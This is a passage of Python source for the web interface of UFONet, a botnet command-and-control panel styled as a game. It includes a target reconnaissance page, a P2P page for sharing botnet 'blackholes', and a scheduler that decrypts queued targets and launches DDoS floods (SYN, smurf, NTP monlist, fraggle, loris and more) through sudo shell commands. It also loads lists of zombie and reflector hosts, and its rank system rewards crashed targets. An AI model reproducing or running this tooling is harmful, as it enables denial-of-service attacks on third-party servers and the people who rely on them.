  </select></td></tr><tr><td>Blackhole/IP:</td><td><input type='text' name='globalnet_source2' id='globalnet_source2' size='20' value='"""+default_blackhole+"""'></td></tr><tr><td><input type="hidden" name="globalnet_enckey" id="globalnet_enckey" size="20" value='"""+self.crypto_key+"""' READONLY></td></tr></table></form><button title="Send your location to other motherships..." onClick=Send() style="color:yellow; height:40px; width:240px; font-weight:bold; background-color:red; border: 2px solid yellow;">SUBMIT!</button></pre></td></tr></table><br><br><hr><br><u>GLOBAL.NET</u>: (Last Update: <font color='green'>"""+str(l)+"""</font>)<br><br>"""+globalnet_table+"""<div id='cmdOut'></div><br><br>"""+ self.pages["/footer"]

    def html_abduction(self):
        return self.pages["/header"] + """<script language="javascript"> 
function Requests() {
        var win_requests = window.open("requests","_blank","fullscreen=no, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Start(){
        target=document.getElementById("target").value
        String.prototype.startsWith = function(prefix){
        return this.indexOf(prefix) === 0;
        }
        if(target.startsWith("http")){
        params="target="+escape(target)
        }else{
          window.alert("Target url not valid! -> It should starts with 'http(s)://'");
          return
        }
        runCommandX("cmd_abduction",params)
}
</script></head><body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
<br>
<center>
<table cellpadding="5" cellspacing="5"><tr>
<td><a href="javascript:alert('Ofgöfeejh says: """ + self.ranking + """... Lets research about our enemies first, right?...');"><img src='data:image/png;base64,"""+self.alien7_img+"""'></a></td>
<td>
<pre>
  This feature will provide you information about target's web server. 
  You can use this before to attack to be more effective.

  <button title="Configure how you will perform requests (proxy, HTTP headers, etc)..." onclick="Requests()">Configure requests</button>

<hr>
  * Set your target: <input type="text" name="target" id="target" size="30" placeholder="http(s)://" required pattern="https?://.+">

<hr>
   <button title="Start to research about your target's webserver configuration..." onClick=Start() style="color:yellow; height:40px; width:240px; font-weight:bold; background-color:red; border: 2px solid yellow;">RESEARCH!</button> 
</pre>
</td></tr></table>
<hr><br>
<div id="cmdOut"></div>""" + self.pages["/footer"]

    def html_blackholes(self):
        return self.pages["/header"] + """<script language="javascript">
function Decrypt(){
        blackhole_key=document.getElementById("blackhole_key").value
        if(blackhole_key == "") {
          window.alert("You need to enter a valid key (provided by someone)");
          return
         }else{
          params="blackhole_key="+escape(blackhole_key)
         runCommandX("cmd_decrypt",params)
         document.getElementById("nb1").style.display = "none";
         }
      }
</script>
<script language="javascript">
function RefreshBlackhole(){
        blackholes_source=document.getElementById("blackholes_source").value
        if(blackholes_source == "") {
          window.alert("You need to enter a valid IP (with a 'blackhole' listening on).");
          return
         }else{
          params="blackholes_source="+escape(blackholes_source)
         runCommandX("cmd_refresh_blackholes",params)
         document.getElementById("nb1").style.display = "none";
         setTimeout("location.reload()", 10000)
         }
      }
</script>
</head><body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
<br>
<center><table cellpadding="2" cellspacing="2"><tr><td><table cellpadding="5" cellspacing="5"><tr>
<td>Blackhole/IP:</td>
<td><input type="text" name="blackholes_source" id="blackholes_source" size="20" value='"""+default_blackhole+"""'></td> 
</tr></table></td><td><button title="Refreshing blackhole..." onClick="RefreshBlackhole()" style="color:yellow; height:40px; width:200px; font-weight:bold; background-color:red; border: 2px solid yellow;">Open Warp!</button></td></tr></table>
<hr>
<table cellpadding="5" cellspacing="5"><tr>
<td><a href="javascript:alert('Dhïkta says: """ + self.ranking + """... I can open warps directly to blackholes created by other motherships. This is nice to share and increase your legion on a crypto-distributed (P2P) way...');"><img src='data:image/png;base64,"""+self.alien3_img+"""'></a></td><td>
<table cellpading="5" cellspacing="10"><tr><td>
<form method='GET'>
Your key: <input type="text" name="blackhole_key" id="blackhole_key" size="20" value='"""+self.crypto_key+"""'>
</td></tr><tr><td>
<a style='color:red;text-decoration:underline red;' onclick=javascript:Decrypt();>Try decryption!</a>
</form>
</td></tr></table></td></tr></table>
<hr><br>
</center>
Last update: <font color='"""+ self.blackholes_status_color + """'>"""+ self.blackholes_datetime + """</font><br><br>
<div id="cmdOut"></div>
<div id="nb1" style="display: block;">"""+self.blackholes_text+"""</div>
""" + self.pages["/footer"]

    def wargames_engage_routine(self, wargames_engage_list): # check jobs when gui refresh (global army supply)
        sep = wargames_msg_sep
        flag_ufosyn = None
        flag_spray = None
        flag_smurf = None
        flag_xmas = None
        flag_nuke = None
        flag_tachyon = None
        flag_monlist = None
        flag_fraggle = None
        flag_sniper = None
        flag_ufoack = None
        flag_uforst = None
        flag_droper = None
        flag_overlap = None
        flag_pinger = None
        flag_ufoudp = None
        for job in wargames_engage_list:
            job_t2 = job.rsplit(sep, 1)[0]
            job_creation = job_t2.rsplit(sep, 1)[0]
            job_target = job_t2.rsplit(sep, 1)[1]
            job_estimated = job.rsplit(sep, 1)[1]
            self.decrypt(self.crypto_key, job_estimated)
            if self.decryptedtext:
                job_estimated_dec = self.decryptedtext
            else:
                job_estimated_dec = ""
            self.decryptedtext = ""
            now = strftime("%d-%m-%Y %H:%M:%S", gmtime())
            now = strptime(now, "%d-%m-%Y %H:%M:%S")
            try:
                job_estimated_dec = strptime(job_estimated_dec.decode('utf-8'), "%d-%m-%Y %H:%M:%S")
            except:
                job_estimated_dec = strptime(job_estimated_dec, "%d-%m-%Y %H:%M:%S")
            if (job_estimated_dec == now or job_estimated_dec < now): # engage it! (when 'now' or '<')
                self.decrypt(self.crypto_key, job_target)
                if self.decryptedtext:
                    job_target_dec = self.decryptedtext
                else:
                    job_target_dec = ""
                self.decryptedtext = ""
                if job_target_dec is not "":
                    job_target_dec = "http://" + job_target_dec # set target prefix to http://
                    try: # read global army supply (json)
                        with open(self.mothership_supplycfg_file) as data_file:
                            data = json.load(data_file)
                    except:
                        print('[Info] [AI] Cannot found: "core/json/supplycfg.json" -> [Generating!]')
                        with open(self.mothership_supplycfg_file, "w") as f:
                            json.dump({"botnet": 1, "loic": 0, "loris": 0, "ufosyn": 0, "spray": 0, "smurf": 0, "xmas": 0, "nuke": 0, "tachyon": 0, "monlist": 0, "fraggle": 0, "sniper": 0, "ufoack": 0, "uforst": 0, "droper": 0, "overlap": 0, "pinger": 0, "ufoudp": 0}, f, indent=4)
                    with open(self.mothership_supplycfg_file) as data_file:
                        data = json.load(data_file)
                    self.supply_botnet = data["botnet"]
                    self.supply_loic = data["loic"]
                    self.supply_loris = data["loris"]
                    self.supply_ufosyn = data["ufosyn"]
                    self.supply_spray = data["spray"]
                    self.supply_smurf = data["smurf"]
                    self.supply_xmas = data["xmas"]
                    self.supply_nuke = data["nuke"]
                    self.supply_tachyon = data["tachyon"]
                    self.supply_monlist = data["monlist"]
                    self.supply_fraggle = data["fraggle"]
                    self.supply_sniper = data["sniper"]
                    self.supply_ufoack = data["ufoack"]
                    self.supply_uforst = data["uforst"]
                    self.supply_droper = data["droper"]
                    self.supply_overlap = data["overlap"]
                    self.supply_pinger = data["pinger"]
                    self.supply_ufoudp = data["ufoudp"]
                    job_estimated_dec = strftime("%d-%m-%Y %H:%M:%S", job_estimated_dec)
                    print("[Info] [Wargames] Time is over: [" + str(job_estimated_dec) + "] -> Engaging target: " + str(job_target_dec))
                    cmd = ""
                    nonroot_cmd = python_version + " -i ufonet -a "+str(job_target_dec)+" -r "+str(self.supply_botnet)+" "
                    root_cmd = "sudo "+ python_version+" -i ufonet -a "+str(job_target_dec)+" -r "+str(self.supply_botnet)+" "
                    if int(self.supply_fraggle) > 0:
                        cmd += "--fraggle " +str(self.supply_fraggle)+ " "
                        flag_fraggle = True
                    if int(self.supply_sniper) > 0:
                        cmd += "--sniper " +str(self.supply_sniper)+ " "
                        flag_sniper = True
                    if int(self.supply_ufoack) > 0:
                        cmd += "--ufoack " +str(self.supply_ufoack)+ " "
                        flag_ufoack = True
                    if int(self.supply_uforst) > 0:
                        cmd += "--uforst " +str(self.supply_uforst)+ " "
                        flag_uforst = True
                    if int(self.supply_droper) > 0:
                        cmd += "--droper " +str(self.supply_droper)+ " "
                        flag_droper = True
                    if int(self.supply_overlap) > 0:
                        cmd += "--overlap " +str(self.supply_overlap)+ " "
                        flag_overlap = True
                    if int(self.supply_pinger) > 0:
                        cmd += "--pinger " +str(self.supply_pinger)+ " "
                        flag_pinger = True
                    if int(self.supply_ufoudp) > 0:
                        cmd += "--ufoudp " +str(self.supply_ufoudp)+ " "
                        flag_ufoudp = True
                    if int(self.supply_monlist) > 0: 
                        cmd += "--monlist " +str(self.supply_monlist)+ " "
                        flag_monlist = True
                    if int(self.supply_tachyon) > 0: 
                        cmd += "--tachyon " +str(self.supply_tachyon)+ " "
                        flag_tachyon = True
                    if int(self.supply_nuke) > 0: 
                        cmd += "--nuke " +str(self.supply_nuke)+ " "
                        flag_nuke = True
                    if int(self.supply_xmas) > 0: 
                        cmd += "--xmas " +str(self.supply_xmas)+ " "
                        flag_xmas = True
                    if int(self.supply_smurf) > 0:
                        cmd += "--smurf " +str(self.supply_smurf)+ " "
                        flag_smurf = True
                    if int(self.supply_spray) > 0:
                        cmd += "--spray " +str(self.supply_spray)+ " "
                        flag_spray = True
                    if int(self.supply_ufosyn) > 0:
                        cmd += "--ufosyn " +str(self.supply_ufosyn)+ " "
                        flag_ufosyn = True
                    if int(self.supply_loris) > 0:
                        cmd += "--loris " +str(self.supply_loris)+ " "
                    if int(self.supply_loic) > 0:
                        cmd += "--loic " +str(self.supply_loic)+ " "
                    if not flag_fraggle and not flag_sniper and not flag_ufoack and not flag_uforst and not flag_droper and not flag_overlap and not flag_pinger and not flag_ufoudp and not flag_monlist and not flag_tachyon and not flag_nuke and not flag_xmas and not flag_smurf and not flag_spray and not flag_ufosyn:
                        cmd = nonroot_cmd + cmd # non root required (LOIC, LORIS)
                    if flag_ufosyn == True or flag_spray == True or flag_smurf == True or flag_xmas == True or flag_nuke == True or flag_tachyon == True or flag_monlist == True or flag_fraggle == True or flag_sniper == True or flag_ufoack == True or flag_uforst == True or flag_droper == True or flag_overlap == True or flag_pinger == True or flag_ufoudp == True:
                        cmd = root_cmd + cmd # root required (UFOSYN, SPRAY, SMURF, XMAS, NUKE, TACHYON, MONLIST, FRAGGLE, SNIPER, UFOACK, UFORST, DROPER, OVERLAP, PINGER, UFOUDP)            
                    runcmd = cmd + " "
                    runcmd = runcmd + "--force-yes &" # no raw_input allowed on webgui (+run it as daemon!)
                    print("[Info] [Wargames] Running command:", runcmd, "\n")
                    os.system(runcmd) # launch it!
                    if "!!!" in job: # remove it from queue (unjob)
                        f = open(self.wargames_file, "r")
                        ls = f.readlines()
                        f.close()
                        f = open(self.wargames_file, "w")
                        for l in ls:
                            if str(l) != str(job):
                                f.write(l)
                            else:
                                job = re.sub('[!!!]', '', job)
                                f.write(job)
                        f.close()

    def extract_ranking_table(self):
        f = open(self.grid_file,"r") # ranking data extracted from grid.txt
        ls = f.readlines()
        f.close()
        if not ls: # not data on grid.txt
            return
        ranking_items={}
        ranking_key = crypto_key
        nodec_text = "Anonymous"
        nodec_num = 0
        self.ranking_grid_total = 0
        try:
            for j in ls:
                if grid_msg_sep in j:
                    self.ranking_grid_total = self.ranking_grid_total + 1
                    m = j.split(grid_msg_sep)
                    ranking_nickname = m[0] # nickname
                    self.decrypt(ranking_key, ranking_nickname)
                    if self.decryptedtext:
                        ranking_nickname = str(self.decryptedtext)
                    else:
                        ranking_nickname = nodec_text
                    if ranking_nickname == "Anonymous":
                        ranking_nickname = ranking_nickname + str(self.ranking_grid_total*3) # add pseudo-rand as end to evade similars
                    self.decryptedtext = "" # clean decryptedtext buffer
                    ranking_ranking = m[1] # ranking
                    self.decrypt(ranking_key, ranking_ranking)
                    if self.decryptedtext:
                        try:
                            ranking_ranking = int(self.decryptedtext)
                        except:
                            ranking_ranking = nodec_num
                    else:
                        ranking_ranking = nodec_num
                ranking_items[ranking_nickname] = ranking_ranking
        except:
            ranking_nickname = "Anonymous"
            ranking_ranking = 0
            ranking_items[ranking_nickname] = ranking_ranking
        self.top_rookie = []
        self.top_mercenary = []
        self.top_bandit = []
        self.top_ufommander = []
        self.top_ufoleet = []
        for k, v in ranking_items.items():
            if v is 0: # not any data (or decryption allowed) on grid so discard
                pass
            if v is 1: # add this player as a rookie
                self.ranking_grid_rookie = self.ranking_grid_rookie + 1
                self.top_rookie.append(k)
            elif v is 2: # add this player as a mercenary
                self.ranking_grid_mercenary = self.ranking_grid_mercenary + 1
                self.top_mercenary.append(k)
            elif v is 3: # add this player as a bandit
                self.ranking_grid_bandit = self.ranking_grid_bandit + 1
                self.top_bandit.append(k)
            elif v is 4: # add this player as a ufommander
                self.ranking_grid_ufommander = self.ranking_grid_ufommander + 1
                self.top_ufommander.append(k)
            elif v is 5: # add this player as a ufoleet
                self.ranking_grid_ufoleet = self.ranking_grid_ufoleet + 1
                self.top_ufoleet.append(k)
            else: # add this player as unknown
                self.ranking_grid_unknown = self.ranking_grid_unknown + 1
        top5 = sorted(ranking_items, key=ranking_items.get, reverse=True)[:5]
        for p in top5: # extract best players
            if self.ranking_top5_player1 == "Anonymous":
                 self.ranking_top5_player1 = p
            elif self.ranking_top5_player2 == "Anonymous":
                 self.ranking_top5_player2 = p
            elif self.ranking_top5_player3 == "Anonymous":
                 self.ranking_top5_player3 = p
            elif self.ranking_top5_player4 == "Anonymous":
                 self.ranking_top5_player4 = p
            elif self.ranking_top5_player5 == "Anonymous":
                 self.ranking_top5_player5 = p
        if self.ranking == "Rookie":
            shuffle(self.top_rookie) # shuffle for different results
            top3 = self.top_rookie[:3]
        elif self.ranking == "Mercenary":
            shuffle(self.top_mercenary)
            top3 = self.top_mercenary[:3]
        elif self.ranking == "Bandit":
            shuffle(self.top_bandit)
            top3 = self.top_bandit[:3]
        elif self.ranking == "UFOmmander!":
            shuffle(self.top_ufommander)
            top3 = self.top_ufommander[:3]
        elif self.ranking == "UFOl33t!":
            shuffle(self.top_ufoleet)
            top3 = self.top_ufoleet[:3]
        for p in top3: # extract similar player 
            if self.ranking_similar_player1 == "Anonymous":
                self.ranking_similar_player1 = p
            elif self.ranking_similar_player2 == "Anonymous":
                self.ranking_similar_player2 = p
            elif self.ranking_similar_player3 == "Anonymous":
                self.ranking_similar_player3 = p
        top1 = sorted(ranking_items, key=ranking_items.get, reverse=True)
        shuffle(top1) # shuffle for different results
        top1 = random.choice(top1).strip() # extract random player 
        self.ranking_top1_player1 = top1      
           
    def __init__(self):
        self.crypto_key = crypto_key # set default symmetric crypto key
        self.agents_file = 'core/txt/user-agents.txt' # set source path to retrieve user-agents
        self.board_file = 'data/board.txt' # set source path to retrieve board warning message
        self.grid_file = 'data/grid.txt' # set source path to retrieve grid
        self.board_warning = "" # set initial (str) board warning message
        self.wargames_file = 'data/wargames.txt' # set source path to retrieve wargames
        self.links_file = 'data/links.txt' # set source path to retrieve links
        self.streams_file = 'data/streams.txt' # set source path to retrieve streams
        self.games_file = 'data/games.txt' # set source path to retrieve games
        self.globalnet_file = 'data/globalnet.txt' # set source path to retrieve Global.Net
        self.zombies_file = "botnet/zombies.txt" # set source path to retrieve 'zombies'
        self.aliens_file = "botnet/aliens.txt" # set source path to retrieve 'aliens'
        self.droids_file = "botnet/droids.txt" # set source path to retrieve 'droids'
        self.ucavs_file = "botnet/ucavs.txt" # set source path to retrieve 'ucavs'
        self.rpcs_file = "botnet/rpcs.txt" # set source path to retrieve 'rpcs'
        self.ntps_file = "botnet/ntp.txt" # set source path to retrieve 'ntps'
        self.dnss_file = "botnet/dns.txt" # set source path to retrieve 'dns'
        self.snmps_file = "botnet/snmp.txt" # set source path to retrieve 'snmps'
        self.release_date_file = "docs/release.date" # set source path to retrieve release date
        self.news = "data/news.txt" # set source path to retrieve server news
        self.missions = "data/missions.txt" # set source path to retrieve server missions
        self.mothership_webcfg_file = 'core/json/webcfg.json' # set source for mothership webcfg
        self.mothership_stats_file = 'core/json/stats.json' # set source for mothership stats
        self.mothership_boardcfg_file = 'core/json/boardcfg.json' # set source for mothership boardcfg
        self.mothership_gridcfg_file = 'core/json/gridcfg.json' # set source for mothership gridcfg
        self.mothership_supplycfg_file = 'core/json/supplycfg.json' # set source for mothership supplyscfg
        self.ranking = "Rookie Star" # set starting rank
        self.decryptedtext = "" # set buffer for decryption
        self.encryptedtext = "" # set buffer for encryption
        self.blackholes = "data/nodes.dat" # set source path to retrieve server blackholes (nodes.dat)
        self.blackhole = default_blackhole # set default blackhole
        self.blackholes_status = "Not connected!" # set default status for blackholes
        self.blackholes_status_color = "red" # set default status color for blackholes
        self.referer = 'http://127.0.0.1/'
        self.mothershipname = "core/txt/shipname.txt"
        self.ufonet_logo_img = open("core/images/ufonet-logo.txt").read()
        self.favicon_img = open("core/images/favicon.txt").read()
        self.mothership_img = open("core/images/mothership.txt").read()
        self.commander_img = open("core/images/commander.txt").read()
        self.board_img = open("core/images/board.txt").read()
        self.aliens_img = open("core/images/aliens.txt").read()
        self.alien1_img = open("core/images/aliens/alien1.txt").read()
        self.alien2_img = open("core/images/aliens/alien2.txt").read()
        self.alien3_img = open("core/images/aliens/alien3.txt").read()
        self.alien4_img = open("core/images/aliens/alien4.txt").read()
        self.alien5_img = open("core/images/aliens/alien5.txt").read()
        self.alien6_img = open("core/images/aliens/alien6.txt").read()
        self.alien7_img = open("core/images/aliens/alien7.txt").read()
        self.alien8_img = open("core/images/aliens/alien8.txt").read()
        self.alien9_img = open("core/images/aliens/alien9.txt").read()
        self.alien10_img = open("core/images/aliens/alien10.txt").read()
        self.alien11_img = open("core/images/aliens/alien11.txt").read()
        self.alien12_img = open("core/images/aliens/alien12.txt").read()
        self.alien13_img = open("core/images/aliens/alien13.txt").read()
        self.ranking_grid_total = 0
        self.ranking_grid_rookie = 0
        self.ranking_grid_mercenary = 0
        self.ranking_grid_bandit = 0
        self.ranking_grid_ufommander = 0
        self.ranking_grid_ufoleet = 0
        self.ranking_grid_unknown = 0
        self.ranking_top5_player1 = "Anonymous"
        self.ranking_top5_player2 = "Anonymous"
        self.ranking_top5_player3 = "Anonymous"
        self.ranking_top5_player4 = "Anonymous"
        self.ranking_top5_player5 = "Anonymous"
        self.ranking_similar_player1 = "Anonymous"
        self.ranking_similar_player2 = "Anonymous"
        self.ranking_similar_player3 = "Anonymous"
        self.ranking_top1_player1 = "Anonymous"
        f = open(self.mothershipname) # extract ship name
        self.mothership_id = f.read()
        self.mothership_id = self.mothership_id[:25] # truncating anti-formats ;-)
        f.close()
        f = open(self.release_date_file) # extract release creation datetime
        self.release_date = f.read()
        # adding AnonTwi (anontwi.03c8.net) cyphering -> AES256+HMAC-SHA1
        self.trans_5C = ''.join([chr (x ^ 0x5c) for x in range(256)])
        self.trans_36 = ''.join([chr (x ^ 0x36) for x in range(256)])
        self.trans_5C = self.trans_5C.encode("latin-1")
        self.trans_36 = self.trans_36.encode("latin-1")
        f.close()
        f = open(self.blackholes) # double extract blackholes (nodes.dat)
        self.blackholes_text = f.read()
        f.close()
        f = open(self.blackholes)
        self.blackholes_block = f.readlines()
        f.close()
        self.list_blackholes = []
        for b in self.blackholes_block:
            self.list_blackholes.append(b)
        self.blackholes_datetime = time.ctime(os.path.getctime('data/nodes.dat')) # extract nodes.dat datetime
        if self.blackholes_datetime == self.release_date_file: # never connected to feeds
            self.blackholes_status_color = "red" # set status color for blackholes to 'red'
        else:
            self.blackholes_status_color = "green" # set status color for blackholes to 'green'
        f = open(self.news) # double extract news
        self.news_text = f.read()
        f.close()
        f = open(self.news)
        self.news_block = f.readlines()
        f.close()
        self.list_news = []
        for n in self.news_block:
            self.list_news.append(n)
        self.news_datetime = time.ctime(os.path.getctime('data/news.txt')) # extract news.txt datetime
        if self.news_datetime == self.release_date_file: # never connected to feeds
            self.news_status_color = "red" # set status color for news to 'red'
        else:
            self.news_status_color = "green" # set status color for news to 'green'
        f = open(self.board_file) # double extract board
        self.moderator_text = f.read()
        f.close()
        f = open(self.board_file)
        self.moderator_block = f.readlines()
        f.close()
        self.list_moderator = []
        for n in self.moderator_block:
            self.list_moderator.append(n) 
        f = open(self.grid_file) # double grid board
        self.grid_text = f.read()
        self.ranking_text = f.read() # ranking data is extracted from grid
        f.close()
        f = open(self.grid_file)
        self.grid_block = f.readlines()
        f.close()
        self.list_grid = []
        for n in self.grid_block:
            self.list_grid.append(n)
        self.ranking_datetime = time.ctime(os.path.getctime('data/grid.txt')) # extract grid.txt datetime for ranking calcs
        if self.ranking_datetime == self.release_date_file: # never connected to feeds
            self.ranking_status_color = "red" # set status color for ranking to 'red'
        else:
            self.ranking_status_color = "green" # set status color for ranking to 'green'
        f = open(self.wargames_file) # double wargames board
        self.wargames_text = f.read()
        f.close()
        f = open(self.wargames_file)
        self.wargames_block = f.readlines()
        f.close()
        self.list_wargames = []
        for n in self.wargames_block:
            self.list_wargames.append(n)
        f = open(self.links_file) # double links extraction
        self.links_text = f.read()
        f.close()
        f = open(self.links_file)
        self.links_block = f.readlines()
        f.close()
        self.list_links = []
        for n in self.links_block:
            self.list_links.append(n)
        f = open(self.globalnet_file) # double globalnet extraction
        self.globalnet_text = f.read()
        f.close()
        f = open(self.globalnet_file)
        self.globalnet_block = f.readlines()
        f.close()
        self.list_globalnet = []
        for n in self.globalnet_block:
            self.list_globalnet.append(n)
        f = open(self.streams_file) # double streams extraction
        self.streams_text = f.read()
        f.close()
        f = open(self.streams_file)
        self.streams_block = f.readlines()
        f.close()
        self.list_streams = []
        for n in self.streams_block:
            self.list_streams.append(n)
        f = open(self.missions) # double extract missions
        self.missions_text = f.read()
        f.close()
        f = open(self.missions)
        self.missions_block = f.readlines()
        f.close()
        self.list_missions = []
        for m in self.missions_block:
            self.list_missions.append(m)
        self.missions_datetime = time.ctime(os.path.getctime('data/missions.txt')) # extract missions.txt datetime
        if self.missions_datetime == self.release_date_file: # never connected to feeds
            self.missions_status_color = "red" # set status color for missions to 'red'
        else:
            self.missions_status_color = "green" # set status color for missions to 'green'
        stats_json_file = open(self.mothership_stats_file, "r") # extract mothership stats
        data = json.load(stats_json_file)
        stats_json_file.close()
        self.abductor = Abductor(self) # call abductor for data size conversor
        self.aflying = data["flying"]
        self.ascanner = data["scanner"]
        self.atransferred = data["transferred"]
        self.amax_chargo = data["max_chargo"]
        self.amissions = data["missions"]
        self.acompleted = data["completed"]
        self.aloic = data["loic"]
        self.aloris = data["loris"]
        self.aufosyn = data["ufosyn"]
        self.aspray = data["spray"]
        self.asmurf = data["smurf"]
        self.axmas = data["xmas"]
        self.anuke = data["nuke"]
        self.atachyon = data["tachyon"]
        self.amonlist = data["monlist"]
        self.afraggle = data["fraggle"]
        self.asniper = data["sniper"]
        self.aufoack = data["ufoack"]
        self.auforst = data["uforst"]
        self.adroper = data["droper"]
        self.aoverlap = data["overlap"]
        self.apinger = data["pinger"]
        self.aufoudp = data["ufoudp"]
        self.tcrashed = data["crashed"]
        if int(self.acompleted) > 0: # check for attacks completed
            self.mothership_acc = Decimal((int(self.tcrashed) * 100) / int(self.acompleted)) # decimal rate: crashed*100/completed
        else:
            self.mothership_acc = 100 # WarGames: "the only way to win in Nuclear War is not to play"
        if int(self.acompleted) < 5: # generating motherships commander ranks by rpg/experiences
            self.ranking = "Rookie"
        elif int(self.acompleted) > 4 and int(self.tcrashed) < 1: # add first ranking step on 5 complete attacks
            self.ranking = "Mercenary"
        elif int(self.tcrashed) > 0 and int(self.tcrashed) < 2: # second ranking step with almost 1 crashed
            self.ranking = "Bandit"
        elif int (self.acompleted) < 50 and int(self.tcrashed) > 4: # third ranking value is only for real "crashers" ;-)
            self.ranking = "UFOmmander!"
        elif int(self.acompleted) > 49 and int(self.tcrashed) > 4: # this people is trying to build a Global Federated Network >-)
            self.ranking = "UFOl33t!"
        f = open(self.zombies_file)
        self.zombies = f.readlines()
        self.zombies = [zombie.replace('\n', '') for zombie in self.zombies]
        self.list_zombies = []
        for zombie in self.zombies:
            t = urlparse(zombie)
            name_zombie = t.netloc
            if "www." in name_zombie:
                name_zombie = name_zombie.replace("www.","")
            self.list_zombies.append(name_zombie)
        self.num_zombies = str(len(self.zombies))
        f.close()
        f = open(self.aliens_file)
        self.aliens = f.readlines()
        self.aliens = [alien.replace('\n', '') for alien in self.aliens]
        self.list_aliens = []
        for alien in self.aliens:
            t = urlparse(alien)
            name_alien = t.netloc
            if "www." in name_alien:
                name_alien = name_alien.replace("www.","")
            self.list_aliens.append(name_alien)
        self.num_aliens = str(len(self.aliens))
        f.close()
        f = open(self.droids_file)
        self.droids = f.readlines()
        self.droids = [droid.replace('\n', '') for droid in self.droids]
        self.list_droids = []
        for droid in self.droids:
            t = urlparse(droid)
            name_droid = t.netloc
            if "www." in name_droid:
                name_droid = name_droid.replace("www.","")
            self.list_droids.append(name_droid)
        self.num_droids = str(len(self.droids))
        f.close()
        f = open(self.ucavs_file)
        self.ucavs = f.readlines()
        self.ucavs = [ucav.replace('\n', '') for ucav in self.ucavs]
        self.list_ucavs = []
        for ucav in self.ucavs:
            t = urlparse(ucav)
            name_ucav = t.netloc
            if "www." in name_ucav:
                name_ucav = name_ucav.replace("www.","")
            self.list_ucavs.append(name_ucav)
        self.num_ucavs = str(len(self.ucavs))
        f.close()
        f = open(self.rpcs_file)
        self.rpcs = f.readlines()
        self.rpcs = [rpc.replace('\n', '') for rpc in self.rpcs]
        self.list_rpcs = []
        for rpc in self.rpcs:
            t = urlparse(rpc)
            name_rpc = t.netloc
            if "www." in name_rpc:
                name_rpc = name_rpc.replace("www.","")
            self.list_rpcs.append(name_rpc)
        self.num_rpcs = str(len(self.rpcs))
        f.close()
        f = open(self.ntps_file)
        self.ntps = f.readlines()
        self.ntps = [ntp.replace('\n', '') for ntp in self.ntps]
        self.list_ntps = []
        for ntp in self.ntps:
            t = urlparse(ntp)
            name_ntp = t.netloc
            if "www." in name_ntp:
                name_ntp = name_ntp.replace("www.","")
            self.list_ntps.append(name_ntp)
        self.num_ntps = str(len(self.ntps))
        f.close()
        f = open(self.dnss_file)
        self.dnss = f.readlines()
        self.dnss = [dns.replace('\n', '') for dns in self.dnss]
        self.list_dnss = []
        for dns in self.dnss:
            t = urlparse(dns)
            name_dns = t.netloc
            if "www." in name_dns:
                name_dns = name_dns.replace("www.","")
            self.list_dnss.append(name_dns)
        self.num_dnss = str(len(self.dnss))
        f.close()
        f = open(self.snmps_file)
        self.snmps = f.readlines()
        self.snmps = [snmp.replace('\n', '') for snmp in self.snmps]
        self.list_snmps = []
        for snmp in self.snmps:
            t = urlparse(snmp)
            name_snmp = t.netloc
            if "www." in name_snmp:
                name_snmp = name_snmp.replace("www.","")
            self.list_snmps.append(name_snmp)
        self.num_snmps = str(len(self.snmps))
        f.close()
        self.total_botnet = str(int(self.num_zombies) + int(self.num_aliens) + int(self.num_droids) + int(self.num_ucavs) + int(self.num_rpcs) + int(self.num_ntps) + int(self.num_dnss) + int(self.num_snmps))
        f = open(self.wargames_file, "r")
        ls = f.readlines()
        f.close()
        self.supply_wargames = 0
        self.wargames_engage_list = []
        for l in ls:
            if "!!!" in l:
                self.wargames_engage_list.append(l)
                self.supply_wargames = self.supply_wargames + 1
        if self.supply_wargames > 0:
            if self.supply_wargames == 1:
                c_supply = "wargame"
            else:
                c_supply = "wargames"
            self.current_tasks = '<br>-----------------------------------\n\n+ Jobs: <a href="/wargames">' + str(self.supply_wargames) + '</a> '+c_supply+''
            self.wargames_engage_routine(self.wargames_engage_list) # threaded jobs engage routine
        else:
           self.current_tasks = ""
        self.options = UFONetOptions()
        self.pages = {}
        self.pages["/header"] = """<!DOCTYPE html><html>
<head>
<link rel="icon" type="image/png" href="/images/favicon.ico" />
<meta name="author" content="psy">
<meta name="robots" content="noindex, nofollow">
<meta http-equiv="content-type" content="text/xml; charset=utf-8" /> 
<title>UFONet - [ C&C/DarkNet ]</title>
<script language="javascript" src="/lib.js"></script>
<script language="javascript" src="js/stars.js"></script>
<style>
body{font-size:15px}a,a:hover{outline:none;color:red;font-size:14px;font-weight:700}nav ul ul{display:none}nav ul li:hover > ul{display:block}nav ul{list-style:none;position:relative;display:inline-table}nav ul:after{content:"";clear:both;display:block}nav ul li{font-size:12px}nav ul li a{display:block;padding:2px 3px}html,body{height:100%}ul,li{margin:0;padding:0}.ringMenu{width:100px;margin:80px auto}.ringMenu ul{list-style:none;position:relative;width:100px;color:#fff}.ringMenu ul a{color:#fff}.ringMenu ul li{-webkit-transition:all .3s ease-in-out;-moz-transition:all .3s ease-in-out;-o-transition:all .3s ease-in-out;transition:all .3s ease-in-out}.ringMenu ul li a{display:block;width:100px;height:100px;background:rgba(50,50,50,0.7);text-align:center;line-height:100px;-webkit-border-radius:50px;-moz-border-radius:50px;border-radius:50px}.ringMenu ul li a:hover{background:rgba(230,150,20,0.7)}.ringMenu ul li:not(.main){-webkit-transform:rotate(-180deg) scale(0);-moz-transform:rotate(-180deg) scale(0);-o-transform:rotate(-180deg) scale(0);transform:rotate(-180deg) scale(0);opacity:0}.ringMenu:hover ul li{-webkit-transform:rotate(0) scale(1);-moz-transform:rotate(0) scale(1);-o-transform:rotate(0) scale(1);transform:rotate(0) scale(1);opacity:1}.ringMenu ul li.top{-webkit-transform-origin:50% 152px;-moz-transform-origin:50% 152px;-o-transform-origin:50% 152px;transform-origin:50% 152px;position:absolute;top:-102px;left:0}.ringMenu ul li.bottom{-webkit-transform-origin:50% 